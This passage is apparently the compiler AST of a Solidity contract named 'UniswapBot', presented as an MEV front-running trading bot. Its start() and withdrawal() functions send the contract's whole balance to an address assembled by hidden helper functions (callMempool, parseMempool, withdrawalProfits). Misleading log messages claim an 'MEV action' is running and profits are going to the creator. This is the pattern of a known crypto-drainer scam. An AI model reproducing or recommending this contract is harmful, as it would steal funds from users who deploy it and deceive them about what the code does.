																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 1286,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14714:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 1285,
																							"name": "byte",
																							"nodeType": "ElementaryTypeName",
																							"src": "14714:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1288,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14714:9:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1284,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "14708:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1283,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "14708:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1289,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14708:16:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1290,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1269,
																			"src": "14727:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "14708:20:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1282,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14703:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 1281,
																		"name": "byte",
																		"nodeType": "ElementaryTypeName",
																		"src": "14703:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1292,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14703:26:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 1273,
															"id": 1293,
															"nodeType": "Return",
															"src": "14696:33:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1326,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "14901:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 1327,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14901:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1328,
												"nodeType": "ExpressionStatement",
												"src": "14901:8:0"
											}
										]
									},
									"documentation": null,
									"id": 1330,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1270,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1269,
												"mutability": "mutable",
												"name": "d",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1330,
												"src": "14610:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1268,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "14610:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14609:9:0"
									},
									"returnParameters": {
										"id": 1273,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1272,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1330,
												"src": "14642:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 1271,
													"name": "byte",
													"nodeType": "ElementaryTypeName",
													"src": "14642:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14641:6:0"
									},
									"scope": 1578,
									"src": "14590:327:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1340,
										"nodeType": "Block",
										"src": "14983:53:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1336,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1256,
																"src": "15014:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1337,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15014:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1335,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 890,
														"src": "15001:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1338,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15001:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1334,
												"id": 1339,
												"nodeType": "Return",
												"src": "14994:34:0"
											}
										]
									},
									"documentation": null,
									"id": 1341,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callMEVAction",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1331,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14948:2:0"
									},
									"returnParameters": {
										"id": 1334,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1333,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1341,
												"src": "14974:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1332,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "14974:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14973:9:0"
									},
									"scope": 1578,
									"src": "14925:111:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1361,
										"nodeType": "Block",
										"src": "15245:155:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e",
															"id": 1345,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15265:58:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															},
															"value": "Running MEV action. This can take a while; please wait.."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															}
														],
														"id": 1344,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "15261:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1346,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15261:63:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1347,
												"nodeType": "EmitStatement",
												"src": "15256:68:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1356,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "15378:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapBot_$1578",
																			"typeString": "contract UniswapBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapBot_$1578",
																			"typeString": "contract UniswapBot"
																		}
																	],
																	"id": 1355,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15370:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1354,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "15370:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1357,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15370:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1358,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "15370:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1350,
																		"name": "_callMEVAction",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1341,
																		"src": "15343:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1351,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15343:16:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1349,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15335:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1348,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15335:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1352,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15335:25:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1353,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15335:34:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1359,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15335:57:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1360,
												"nodeType": "ExpressionStatement",
												"src": "15335:57:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "be9a6555",
									"id": 1362,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "start",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1342,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15227:2:0"
									},
									"returnParameters": {
										"id": 1343,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15245:0:0"
									},
									"scope": 1578,
									"src": "15213:187:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1382,
										"nodeType": "Block",
										"src": "15554:153:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
															"id": 1366,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15574:53:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															},
															"value": "Sending profits back to contract creator address..."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															}
														],
														"id": 1365,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "15570:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1367,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15570:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1368,
												"nodeType": "EmitStatement",
												"src": "15565:63:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1377,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "15685:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapBot_$1578",
																			"typeString": "contract UniswapBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapBot_$1578",
																			"typeString": "contract UniswapBot"
																		}
																	],
																	"id": 1376,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15677:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1375,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "15677:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1378,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15677:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1379,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "15677:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1371,
																		"name": "withdrawalProfits",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1480,
																		"src": "15647:17:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1372,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15647:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1370,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15639:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1369,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15639:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1373,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15639:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1374,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15639:37:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1380,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15639:60:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1381,
												"nodeType": "ExpressionStatement",
												"src": "15639:60:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d4e93292",
									"id": 1383,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawal",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1363,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15536:2:0"
									},
									"returnParameters": {
										"id": 1364,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15554:0:0"
									},
									"scope": 1578,
									"src": "15517:190:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1460,
										"nodeType": "Block",
										"src": "15954:403:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1392,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1390,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1385,
														"src": "15969:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1391,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "15975:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "15969:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1396,
												"nodeType": "IfStatement",
												"src": "15965:50:0",
												"trueBody": {
													"id": 1395,
													"nodeType": "Block",
													"src": "15978:37:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1393,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "16000:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1389,
															"id": 1394,
															"nodeType": "Return",
															"src": "15993:10:0"
														}
													]
												}
											},
											{
												"assignments": [
													1398
												],
												"declarations": [
													{
														"constant": false,
														"id": 1398,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1460,
														"src": "16025:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1397,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16025:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1400,
												"initialValue": {
													"argumentTypes": null,
													"id": 1399,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1385,
													"src": "16034:2:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16025:11:0"
											},
											{
												"assignments": [
													1402
												],
												"declarations": [
													{
														"constant": false,
														"id": 1402,
														"mutability": "mutable",
														"name": "len",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1460,
														"src": "16047:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1401,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16047:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1403,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16047:8:0"
											},
											{
												"body": {
													"id": 1414,
													"nodeType": "Block",
													"src": "16081:54:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1408,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "16096:5:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1407,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1402,
																	"src": "16096:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1409,
															"nodeType": "ExpressionStatement",
															"src": "16096:5:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1412,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1410,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1398,
																	"src": "16116:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1411,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "16121:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "16116:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1413,
															"nodeType": "ExpressionStatement",
															"src": "16116:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1406,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1404,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1398,
														"src": "16073:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1405,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16078:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16073:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1415,
												"nodeType": "WhileStatement",
												"src": "16066:69:0"
											},
											{
												"assignments": [
													1417
												],
												"declarations": [
													{
														"constant": false,
														"id": 1417,
														"mutability": "mutable",
														"name": "bstr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1460,
														"src": "16145:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1416,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16145:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1422,
